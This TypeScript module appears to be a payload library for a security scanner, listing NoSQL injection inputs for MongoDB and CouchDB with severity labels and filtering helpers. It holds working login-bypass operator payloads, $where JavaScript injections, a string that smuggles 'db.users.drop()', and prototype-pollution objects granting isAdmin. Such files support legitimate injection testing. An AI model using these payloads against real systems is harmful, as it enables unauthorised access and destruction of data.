/**
 * NoSQL Injection Payloads
 * Payloads for testing MongoDB, CouchDB, and other NoSQL databases
 */

export interface NoSQLInjectionPayload {
  payload: any; // Can be object, string, or number
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  database?: 'mongodb' | 'couchdb' | 'cassandra' | 'dynamodb';
}

export const NOSQL_INJECTION_PAYLOADS: NoSQLInjectionPayload[] = [
  // MongoDB injection
  {
    payload: { $ne: null },
    description: "MongoDB not equal operator injection",
    severity: 'high',
    database: 'mongodb',
  },
  {
    payload: { $ne: '' },
    description: "MongoDB not equal empty string",
    severity: 'high',
    database: 'mongodb',
  },
  {
    payload: { $gt: '' },
    description: "MongoDB greater than operator",
    severity: 'high',
    database: 'mongodb',
  },
  {
    payload: { $regex: '.*' },
    description: "MongoDB regex operator injection",
    severity: 'high',
    database: 'mongodb',
  },
  {
    payload: { $where: "this.username == 'admin'" },
    description: "MongoDB $where operator injection",
    severity: 'critical',
    database: 'mongodb',
  },
  {
    payload: { $where: "this.password.length > 0" },
    description: "MongoDB $where with JavaScript",
    severity: 'critical',
    database: 'mongodb',
  },
  {
    payload: { $or: [{ username: 'admin' }, { password: { $ne: '' } }] },
    description: "MongoDB $or operator injection",
    severity: 'high',
    database: 'mongodb',
  },
  {
    payload: { $and: [{ username: { $ne: null } }, { password: { $ne: null } }] },
    description: "MongoDB $and operator injection",
    severity: 'high',
    database: 'mongodb',
  },
  {
    payload: { $nin: [] },
    description: "MongoDB not in operator",
    severity: 'medium',
    database: 'mongodb',
  },
  {
    payload: { $exists: true },
    description: "MongoDB exists operator",
    severity: 'medium',
    database: 'mongodb',
  },
  
  // String-based MongoDB injection
  {
    payload: "'; return true; var x='",
    description: "MongoDB JavaScript injection in string",
    severity: 'critical',
    database: 'mongodb',
  },
  {
    payload: "'; db.users.drop(); var x='",
    description: "MongoDB command injection in string",
    severity: 'critical',
    database: 'mongodb',
  },
  
  // CouchDB injection
  {
    payload: { $or: [{ username: 'admin' }, { '1': '1' }] },
    description: "CouchDB $or operator injection",
    severity: 'high',
    database: 'couchdb',
  },
  {
    payload: { selector: { username: { $eq: 'admin' } } },
    description: "CouchDB selector injection",
    severity: 'high',
    database: 'couchdb',
  },
  
  // Generic NoSQL injection patterns
  {
    payload: { __proto__: { isAdmin: true } },
    description: "Prototype pollution attack",
    severity: 'critical',
  },
  {
    payload: { constructor: { prototype: { isAdmin: true } } },
    description: "Constructor prototype pollution",
    severity: 'critical',
  },
  {
    payload: JSON.parse('{"__proto__":{"isAdmin":true}}'),
    description: "JSON prototype pollution",
    severity: 'critical',
  },
];

/**
 * Convert payload to string format for URL/query parameter injection
 */
export function nosqlPayloadToString(payload: any): string {
  if (typeof payload === 'string') {
    return payload;
  }
  try {
    return JSON.stringify(payload);
  } catch {
    return String(payload);
  }
}

/**
 * Get NoSQL injection payloads filtered by database type
 */
export function getNoSQLInjectionPayloads(database?: string): NoSQLInjectionPayload[] {
  if (!database) {
    return NOSQL_INJECTION_PAYLOADS;
  }
  return NOSQL_INJECTION_PAYLOADS.filter(
    p => !p.database || p.database.toLowerCase() === database.toLowerCase()
  );
}

